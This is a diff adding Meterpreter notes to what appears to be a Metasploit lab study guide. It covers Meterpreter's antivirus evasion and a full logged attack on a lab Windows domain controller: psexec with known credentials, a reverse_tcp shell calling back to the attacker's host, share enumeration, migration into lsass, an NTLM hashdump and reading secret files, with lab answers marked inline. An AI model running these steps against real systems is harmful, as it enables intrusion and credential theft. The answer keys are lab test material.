@@ -1166,6 +1166,252 @@ You have also seen how the database feature can help you with penetration testin
 Finally, you should have gained some experience with msfvenom and the creation of stand-alone Meterpreter payloads. This is especially helpful in situations where you can upload a file to the target system or have the ability to download files to the target system. Meterpreter is a powerful tool that offers a lot of easy to use features during the post-exploitation phase. 
 
 
+## METERPRETER
+
+Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.
+
+**How does Meterpreter work?**  
+Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.
+Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.
+
+While Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.
+
+
+
+The example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the getpid command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).
+
+It is also worth noting that Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system.
+
+### POST EXPLOITATION
+
+```
+TARGET=10.10.100.17
+sudo nmap -sS -sV -T4 --min-rate 8888 $TARGET -sC 
+
+```
+
+10.10.100.17
+username: ballen
+password: Password1
+
+
+```
+└─# sudo nmap -sS -sV -T4 --min-rate 8888 10.10.100.17
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-24 10:16:15Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: FLASH.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: FLASH.local0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+MAC Address: 02:BD:E0:7B:1E:15 (Unknown)
+Service Info: Host: ACME-TEST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+# -sC  Added scripting engine
+
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2022-11-24T10:18:32+00:00; 0s from scanner time.
+| rdp-ntlm-info:
+|   Target_Name: FLASH # ANSWER 2 #
+|   NetBIOS_Domain_Name: FLASH # ANSWER 2#
+|   NetBIOS_Computer_Name: ACME-TEST # ANSWER 1#
+|   DNS_Domain_Name: FLASH.local
+|   DNS_Computer_Name: ACME-TEST.FLASH.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2022-11-24T10:17:53+00:00
+| ssl-cert: Subject: commonName=ACME-TEST.FLASH.local
+| Not valid before: 2022-11-23T09:55:43
+|_Not valid after:  2023-05-25T09:55:43
+MAC Address: 02:BD:E0:7B:1E:15 (Unknown)
+Service Info: Host: ACME-TEST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2022-11-24T10:17:53
+|_  start_date: N/A
+|_nbstat: NetBIOS name: ACME-TEST, NetBIOS user: <unknown>, NetBIOS MAC: 02bde07b1e15 (unknown)
+
+```
+
+
+using msfconsole
+```
+msf6 exploit(windows/smb/psexec) >
+msf6 exploit(windows/smb/psexec) > show options
+
+Module options (exploit/windows/smb/psexec):
+
+Name                  Current Setting  Required  Description
+----                  ---------------  --------  -----------
+RHOSTS                10.10.100.17     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+RPORT                 445              yes       The SMB service port (TCP)
+SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
+SERVICE_DISPLAY_NAME                   no        The service display name
+SERVICE_NAME                           no        The service name
+SMBDomain             .                no        The Windows domain to use for authentication
+SMBPass               Password1        no        The password for the specified username
+SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+SMBUser               ballen           no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+LHOST     10.10.3.117      yes       The listen address (an interface may be specified)
+LPORT     4444             yes       The listen port
+
+#  first sending it as background session to use post exploitation session
+msf6 exploit(windows/smb/psexec) > run -z
+
+[*] Started reverse TCP handler on 10.10.3.117:4444
+[*] 10.10.100.17:445 - Connecting to the server...
+[*] 10.10.100.17:445 - Authenticating to 10.10.100.17:445 as user 'ballen'...
+[*] 10.10.100.17:445 - Selecting PowerShell target
+[*] 10.10.100.17:445 - Executing the payload...
+[+] 10.10.100.17:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175686 bytes) to 10.10.100.17
+[*] Meterpreter session 1 opened (10.10.3.117:4444 -> 10.10.100.17:61307) at 2022-11-24 10:25:01 +0000
+[*] Session 1 created in the background.
+
+# NOW GATHERING ENUM DOMAIN
+msf6 post(windows/gather/enum_domain) > show options
+Module options (post/windows/gather/enum_domain):
+
+Name     Current Setting  Required  Description
+----     ---------------  --------  -----------
+SESSION  1                yes       The session to run this module on
+
+msf6 post(windows/gather/enum_domain) > run
+
+[+] Domain FQDN: FLASH.local
+[+] Domain NetBIOS Name: FLASH
+[+] Domain Controller: ACME-TEST.FLASH.local (IP: 10.10.100.17)
+[*] Post module execution completed
+
+# NOW GATHERING ENUM SHARES
+msf6 post(windows/gather/enum_shares) > show options
+
+Module options (post/windows/gather/enum_shares):
+
+Name     Current Setting  Required  Description
+----     ---------------  --------  -----------
+CURRENT  true             yes       Enumerate currently configured shares
+ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialog
+RECENT   true             yes       Enumerate recently mapped shares
+SESSION  1                yes       The session to run this module on
+
+msf6 post(windows/gather/enum_shares) > run
+
+[*] Running module against ACME-TEST (10.10.100.17)
+[*] The following shares were found:
+[*]     Name: SYSVOL
+[*]     Path: C:\Windows\SYSVOL\sysvol
+[*]     Remark: Logon server share
+[*]     Type: DISK
+[*]
+[*]     Name: NETLOGON
+[*]     Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
+[*]     Remark: Logon server share
+[*]     Type: DISK
+[*]
+[*]     Name: speedster
+[*]     Path: C:\Shares\speedster
+[*]     Type: DISK
+[*]
+[*] Post module execution completed
+
+
+# NOW MIGRATE TO ANOTHER PROCESS TO HASHDUMP
+
+msf6 post(windows/gather/enum_shares) > sessions
+
+Active sessions
+===============
+
+Id  Name  Type                     Information                      Connection
+--  ----  ----                     -----------                      ----------
+1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.10.3.117:4444 -> 10.10.100.17:61307 (10.10.100.17)
+
+msf6 post(windows/gather/enum_shares) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > ps | grep lsass
+Filtering on 'lsass'
+
+Process List
+============
+
+PID  PPID  Name       Arch  Session  User                 Path
+---  ----  ----       ----  -------  ----                 ----
+768  640   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe
+
+meterpreter > migrate 768
+[*] Migrating from 3320 to 768...
+[*] Migration completed successfully.
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
+ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
+jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
+lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
+erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
+ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:9bbd9adf7aa9aad6230caae37930a3ac:::
+
+# 69596c7aa1e8daee17f8e78870e25a5c - ANSWER 4
+# SEARCHING FILE
+meterpreter > search -f secrets.txt
+Found 1 result...
+=================
+
+Path                                                            Size (bytes)  Modified (UTC)
+----                                                            ------------  --------------
+c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 07:44:27 +0000
+
+meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt" # ANSWER 6
+My Twitter password is KDSvbsw3849! # ANSWER 7
+
+meterpreter > search -f realsecret.txt
+Found 1 result...
+=================
+
+Path                               Size (bytes)  Modified (UTC)
+----                               ------------  --------------
+c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 08:30:24 +0000
+
+meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt" # ANSWER 7
+The Flash is the fastest man alive   # ANSWER 8
+meterpreter >
+
+```
+
+
+
+
+
+
+
+
+
+
 
 
 
